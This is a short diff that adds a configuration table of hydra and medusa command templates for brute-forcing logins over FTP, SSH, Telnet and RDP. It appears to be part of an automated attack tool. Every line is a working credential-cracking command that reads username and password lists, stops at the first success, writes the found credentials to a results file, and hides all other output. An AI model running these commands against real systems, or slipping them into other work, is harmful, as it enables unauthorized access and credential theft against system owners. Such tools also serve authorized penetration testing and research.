@@ -1,0 +1,9 @@
+FTP	hydra -q -f -L $NamesFile -P $PassFile -o "$SYSFOLDER/BFRes.txt" $Service://$Address > /dev/null 2>&1
+SSH	hydra -q -f -L $NamesFile -P $PassFile -o "$SYSFOLDER/BFRes.txt" $Service://$Address > /dev/null 2>&1
+Telnet	hydra -q -f -L $NamesFile -P $PassFile -o "$SYSFOLDER/BFRes.txt" $Service://$Address > /dev/null 2>&1
+RDP	hydra -q -f -L $NamesFile -P $PassFile -o "$SYSFOLDER/BFRes.txt" $Service://$Address > /dev/null 2>&1
+
+FTP	medusa -f -h $Address -U $NamesFile -P $PassFile -M $Service -f -O $SYSFOLDER/BFRes.txt > /dev/null 2>&1
+SSH	medusa -h $Address -U $NamesFile -P $PassFile -M $Service -f -O $SYSFOLDER/BFRes.txt > /dev/null 2>&1
+Telnet	medusa -h $Address -U $NamesFile -P $PassFile -M $Service -f -O $SYSFOLDER/BFRes.txt > /dev/null 2>&1
+RDP	medusa -h $Address -U $NamesFile -P $PassFile -M $Service -f -O $SYSFOLDER/BFRes.txt > /dev/null 2>&1
